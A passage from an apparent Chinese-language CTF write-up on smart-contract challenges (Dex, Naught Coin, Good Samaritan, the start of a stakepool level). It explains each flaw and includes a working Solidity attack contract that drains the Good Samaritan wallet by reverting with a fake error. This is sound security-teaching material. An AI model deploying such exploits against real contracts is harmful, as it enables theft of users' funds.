= _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function <span class="title function_">addLiquidity</span><span class="params">(address token_address, uint amount)</span> public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function <span class="title function_">swap</span><span class="params">(address from, address to, uint amount)</span> public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), <span class="string">&quot;Invalid tokens&quot;</span>);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">getSwapPrice</span><span class="params">(address from, address to, uint amount)</span> public view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">balanceOf</span><span class="params">(address token, address account)</span> public view <span class="title function_">returns</span> <span class="params">(uint)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, <span class="built_in">string</span> memory name, <span class="built_in">string</span> memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">approve</span><span class="params">(address owner, address spender, uint256 amount)</span> public &#123;</span><br><span class="line">    require(owner != _dex, <span class="string">&quot;InvalidApprover&quot;</span>);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">swap</span><span class="params">(address from, address to, uint amount)</span> public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), <span class="string">&quot;Invalid tokens&quot;</span>);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里其实并没有什么漏洞，只是涉及到token与token之间兑换的利率<br>将10个token1送给合约，然后用10个token2去swap token1,能换出大于10个的token1<br>然后再用token1去换更多的token2,就这样一直循环，会换出更多的token,从而完成目标。<br>还有一个重点，那就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), <span class="string">&quot;Invalid tokens&quot;</span>);</span><br><span class="line">这句检查了token1与token2的正确性，防止别人用自己创造的token</span><br></pre></td></tr></table></figure><h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><p>目的：完成转账</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = &#x27;NaughtCoin&#x27;;</span></span><br><span class="line">  <span class="comment">// string public constant symbol = &#x27;0x0&#x27;;</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint public timeLock = block.timestamp + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(<span class="string">&#x27;NaughtCoin&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>) &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span>**uint256(decimals()));</span><br><span class="line">    <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>), player, INITIAL_SUPPLY)</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function <span class="title function_">transfer</span><span class="params">(address _to, uint256 _value)</span> override public lockTokens <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier <span class="title function_">lockTokens</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>漏洞：题目只是限制了transfer,并没有限制transferfrom,因此完成<br>另外说一下super关键字的用法，super是指继承的合约（一定要是最前面的）<br>不管继承多少个，反正就是super所在合约的继承目录中最前面的那一个</p><h2 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h2><p>目的：转走所有的钱，交互合约为GoodSamaritan<br>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;openzeppelin-contracts-08/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritan &#123;</span><br><span class="line">    Wallet public wallet;</span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        wallet = new Wallet();</span><br><span class="line">        coin = new Coin(address(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.setCoin(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">requestDonation</span><span class="params">()</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span> enoughBalance)</span>&#123;</span><br><span class="line">        <span class="comment">// donate 10 coins to requester</span></span><br><span class="line">        try wallet.donate10(msg.sender) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; catch (bytes memory err) &#123;</span><br><span class="line">            <span class="keyword">if</span> (keccak256(abi.encodeWithSignature(<span class="string">&quot;NotEnoughBalance()&quot;</span>)) == keccak256(err)) &#123;</span><br><span class="line">                <span class="comment">// send the coins left</span></span><br><span class="line">                wallet.transferRemainder(msg.sender);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line">    using Address <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error <span class="title function_">InsufficientBalance</span><span class="params">(uint256 current, uint256 required)</span>;</span><br><span class="line"></span><br><span class="line">    constructor(address wallet_) &#123;</span><br><span class="line">        <span class="comment">// one million coins for Good Samaritan initially</span></span><br><span class="line">        balances[wallet_] = <span class="number">10</span>**<span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address dest_, uint256 amount_)</span> external &#123;</span><br><span class="line">        uint256 currentBalance = balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transfer only occurs if balance is enough</span></span><br><span class="line">        <span class="keyword">if</span>(amount_ &lt;= currentBalance) &#123;</span><br><span class="line">            balances[msg.sender] -= amount_;</span><br><span class="line">            balances[dest_] += amount_;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(dest_.isContract()) &#123;</span><br><span class="line">                <span class="comment">// notify contract </span></span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            revert InsufficientBalance(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    <span class="comment">// The owner of the wallet instance</span></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    error <span class="title function_">OnlyOwner</span><span class="params">()</span>;</span><br><span class="line">    error <span class="title function_">NotEnoughBalance</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(msg.sender != owner) &#123;</span><br><span class="line">            revert <span class="title function_">OnlyOwner</span><span class="params">()</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">donate10</span><span class="params">(address dest_)</span> external onlyOwner &#123;</span><br><span class="line">        <span class="comment">// check balance left</span></span><br><span class="line">        <span class="keyword">if</span> (coin.balances(address(this)) &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            revert <span class="title function_">NotEnoughBalance</span><span class="params">()</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// donate 10 coins</span></span><br><span class="line">            coin.transfer(dest_, <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transferRemainder</span><span class="params">(address dest_)</span> external onlyOwner &#123;</span><br><span class="line">        <span class="comment">// transfer balance left</span></span><br><span class="line">        coin.transfer(dest_, coin.balances(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">setCoin</span><span class="params">(Coin coin_)</span> external onlyOwner &#123;</span><br><span class="line">        coin = coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function <span class="title function_">notify</span><span class="params">(uint256 amount)</span> external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞：漏洞在于Coin合约的transfer中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INotifyable(dest_).notify(amount_);</span><br><span class="line">这一句调用了dest_合约，如果传入的token大于<span class="number">10</span>，那么我们让这个合约revert <span class="string">&quot;NotEnoughBalance()&quot;</span></span><br><span class="line">就会转走所有的钱。</span><br></pre></td></tr></table></figure><p>攻击合约</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">interface GoodSamaritan&#123;</span><br><span class="line">     function <span class="title function_">requestDonation</span><span class="params">()</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span> enoughBalance)</span>;</span><br><span class="line">&#125;</span><br><span class="line">contract INotifyable &#123;</span><br><span class="line">    GoodSamaritan public addr;</span><br><span class="line">    error <span class="title function_">NotEnoughBalance</span><span class="params">()</span>;</span><br><span class="line">    constructor(address add)&#123;</span><br><span class="line">        addr=GoodSamaritan(add);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">notify</span><span class="params">(uint amount)</span> external pure&#123;</span><br><span class="line">        <span class="keyword">if</span>(amount&lt;=<span class="number">10</span>)&#123;  <span class="comment">//这一点是精髓，因为如果不限制amount的话，当他准备转走所有的钱的时候，也会被revert,因为他们用的都是同一个转账函数</span></span><br><span class="line">        revert <span class="title function_">NotEnoughBalance</span><span class="params">()</span>;</span><br><span class="line">    &#125;&#125;</span><br><span class="line">    function <span class="title function_">request</span><span class="params">()</span> external &#123;</span><br><span class="line">        addr.requestDonation();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="stakepool"><a href="#stakepool" class="headerlink" title="stakepool"></a>stakepool</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    function <span class="title function_">add</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        require(c &gt;= a, <span class="string">&quot;SafeMath: addition overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">sub</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        require(b &lt;= a, <span class="string">&quot;SafeMath: subtraction overflow&quot;</span>);</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">mul</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        require(c / a == b, <span class="string">&quot;SafeMath: multiplication overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">div</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        require(b &gt; <span class="number">0</span>, <span class="string">&quot;SafeMath: division by zero&quot;</span>);</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">mod</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        require(b != <span class="number">0</span>, <span class="string">&quot;SafeMath: modulo by zero&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract ERC20 &#123;</span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) public _balances;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint256)) public _allowances;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> public _name;</span><br><span class="line">    <span class="built_in">string</span> public _symbol;</span><br><span class="line">    uint8 public _decimals;</span><br><span class="line"></span><br><span class="line">    constructor (<span class="built_in">string</span> memory name, <span class="built_in">string</span> memory symbol) public &#123;</span><br><span class="line">        _name = name;</span><br><span class="line">        _symbol = symbol;</span><br><span class="line">        _decimals = <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span> public view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint256 amount)</span> public virtual <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        _transfer(msg.sender, recipient, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint256 amount)</span> public virtual <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address sender, address recipient, uint256 amount)</span> public virtual <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(sender != address(<span class="number">0</span>), <span class="string">&quot;ERC20: transfer from the zero address&quot;</span>);</span><br><span class="line">        require(recipient != address(<span class="number">0</span>), <span class="string">&quot;ERC20: transfer to the zero address&quot;</span>);</span><br><span class="line"></span><br><span class="line">        _balances[sender] = _balances[sender].sub(amount);</span><br><span class="line">        _balances[recipient] = _balances[recipient].add(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(<span class="number">0</span>), <span class="string">&quot;ERC20: mint to the zero address&quot;</span>);</span><br><span class="line">        _balances[account] = _balances[account].add(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(<span class="number">0</span>), <span class="string">&quot;ERC20: burn from the zero address&quot;</span>);</span><br><span class="line">        _balances[account] = _balances[account].sub(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(owner != address(<span class="number">0</span>), <span class="string">&quot;ERC20: approve from the zero address&quot;</span>);</span><br><span class="line">        require(spender != address(<span class="number">0</span>), <span class="string">&quot;ERC20: approve to the zero address&quot;</span>);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ZT is <span class="title function_">ERC20</span><span class="params">(<span class="string">&quot;ZERO TOKEN&quot;</span>, <span class="string">&quot;ZT&quot;</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//RULE 1</span></span><br><span class="line">    bytes32 constant RULE_WITHDRAW_WANT = keccak256(abi.encodePacked(<span 